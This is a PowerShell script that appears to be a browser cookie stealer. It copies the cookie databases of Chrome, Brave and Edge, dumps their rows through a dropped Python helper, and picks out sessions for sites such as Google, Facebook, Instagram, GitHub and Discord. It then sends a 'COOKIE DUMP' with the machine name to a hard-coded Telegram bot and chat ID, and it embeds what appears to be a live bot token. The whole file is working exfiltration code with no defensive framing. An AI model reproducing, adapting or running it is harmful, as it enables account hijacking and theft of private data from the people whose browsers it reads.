$BotToken = "8770095089:AAFs6Z4raZGnwTqL1aJdDEjVWeu5fa7okZw"
$ChatID = "962420340"

function Send-TG($text) {
    $body = @{ chat_id = $ChatID; text = $text; parse_mode = "HTML" } | ConvertTo-Json -Compress
    irm "https://api.telegram.org/bot$BotToken/sendMessage" -Method POST -Body $body -ContentType "application/json" | Out-Null
}

function Get-CookiesFromDB($path, $browser) {
    if (!(Test-Path $path)) { return @() }
    $tmp = "$env:TEMP\cookies_temp.db"
    Copy-Item $path $tmp -Force
    
    $cookies = @()
    try {
        Add-Type -Path "C:\Program Files\System.Data.SQLite\bin\System.Data.SQLite.dll" -ErrorAction SilentlyContinue
        $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tmp")
        $conn.Open()
        $cmd = $conn.CreateCommand()
        $cmd.CommandText = "SELECT host_key, name, encrypted_value, path, is_secure, is_httponly FROM cookies"
        $reader = $cmd.ExecuteReader()
        while ($reader.Read()) {
            $cookies += @{
                domain = $reader["host_key"]
                name = $reader["name"]
                encrypted = $reader["encrypted_value"]
                path = $reader["path"]
                secure = $reader["is_secure"]
                httpOnly = $reader["is_httponly"]
                browser = $browser
            }
        }
        $conn.Close()
    } catch {}
    Remove-Item $tmp -Force
    return $cookies
}

# Try Python3 as fallback (available on most systems)
function Get-CookiesViaPython($path, $browser) {
    if (!(Test-Path $path)) { return @() }
    $tmp = "$env:TEMP\cookies_temp.db"
    Copy-Item $path $tmp -Force
    
    $pyScript = @"
import sqlite3, json, sys
conn = sqlite3.connect(r"$tmp")
c = conn.cursor()
c.execute("SELECT host_key, name, encrypted_value, path, is_secure, is_httponly FROM cookies")
rows = c.fetchall()
cookies = []
for r in rows:
    cookies.append({"domain":r[0],"name":r[1],"encrypted":r[2].hex(),"path":r[3],"secure":bool(r[4]),"httpOnly":bool(r[5]),"browser":"$browser"})
print(json.dumps(cookies))
conn.close()
"@
    $pyScript | Out-File "$env:TEMP\cookiegrab.py" -Encoding UTF8
    $result = python3 "$env:TEMP\cookiegrab.py" 2>$null
    if (!$result) { $result = python "$env:TEMP\cookiegrab.py" 2>$null }
    Remove-Item "$env:TEMP\cookiegrab.py" -Force
    Remove-Item $tmp -Force
    if ($result) { return $result | ConvertFrom-Json }
    return @()
}

$allCookies = @()
$browsers = @(
    @{Name="Chrome"; Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"},
    @{Name="Brave"; Path="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies"},
    @{Name="Edge"; Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"}
)

foreach ($b in $browsers) {
    $cookies = Get-CookiesViaPython $b.Path $b.Name
    if ($cookies) { $allCookies += $cookies }
}

if ($allCookies.Count -eq 0) {
    Send-TG "❌ No cookies found or Python not available."
    exit
}

# Group and display
$priority = @('instagram.com','facebook.com','youtube.com','google.com','twitter.com','x.com','reddit.com','github.com','discord.com','tiktok.com')
$grouped = $allCookies | Group-Object domain

$msg = "📦 <b>COOKIE DUMP</b>`n💻 $env:COMPUTERNAME`n🍪 $($allCookies.Count) cookies`n`n━━━ <b>PLATFORMS</b> ━━━`n"

foreach ($p in $priority) {
    $found = $grouped | Where-Object { $_.Name -like "*$p*" }
    if ($found) {
        $msg += "`n🔑 <b>$p</b> ($(($found.Group).Count) cookies)`n"
        foreach ($c in ($found.Group | Select-Object -First 8)) {
            $msg += "  • <code>$($c.name)</code> [$($c.browser)]`n"
        }
    }
}

Send-TG $msg
Send-TG "✅ Decryption not available from PowerShell. Only cookie names shown."
